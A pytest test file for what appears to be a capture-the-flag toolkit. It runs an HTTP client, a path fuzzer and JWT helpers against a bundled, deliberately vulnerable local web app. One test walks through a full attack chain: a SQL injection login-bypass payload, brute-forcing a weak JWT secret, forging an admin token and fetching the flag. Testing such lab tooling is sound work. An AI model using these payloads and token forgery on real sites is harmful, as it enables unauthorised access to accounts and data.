"""muteki_kit.web.http + fuzz against the local vuln app."""

import pytest

from examples.vuln_web_app import FLAG, JWT_SECRET, serve
from muteki_kit.web import jwt as kjwt
from muteki_kit.web.fuzz import fuzz_paths
from muteki_kit.web.http import HTTPClient


@pytest.fixture(scope="module")
def target():
    srv, url = serve()
    yield url
    srv.shutdown()


def test_get_landing(target) -> None:
    c = HTTPClient(target)
    r = c.get("/")
    assert r.status == 200
    assert "Baby Web" in r.body


def test_robots_leaks_path(target) -> None:
    c = HTTPClient(target)
    r = c.get("/robots.txt")
    assert "/s3cr3t_admin" in r.find(r"Disallow: (\S+)", 0)


def test_fuzz_finds_hidden_endpoints(target) -> None:
    res = fuzz_paths(target, wordlist=["robots.txt", "s3cr3t_admin", "encoded", "admin", "nope404"])
    paths = {h.path for h in res.interesting()}
    assert "robots.txt" in paths
    assert "encoded" in paths
    # admin returns 401 (interesting), nope404 is filtered
    assert "nope404" not in paths


def test_full_solve_chain_via_tools(target) -> None:
    """Exercise the whole web toolchain the way a solver would, end to end."""
    c = HTTPClient(target)

    # 1. SQLi login bypass -> get a guest JWT cookie
    r = c.post("/login", data={"user": "admin' OR '1'='1", "pass": "x"})
    assert r.status == 200
    guest = r.cookies.get("auth")
    assert guest, "expected auth cookie"

    # 2. brute the weak JWT secret
    res = kjwt.brute_hs256(guest, kjwt.COMMON_SECRETS)
    assert res.found and res.secret == JWT_SECRET

    # 3. forge admin:true, re-sign, set cookie
    forged = kjwt.sign_hs256({"user": "guest", "admin": True}, res.secret)
    c.set_cookie("auth", forged)

    # 4. hit /admin -> flag
    r2 = c.get("/admin")
    assert r2.status == 200
    assert r2.flag == FLAG
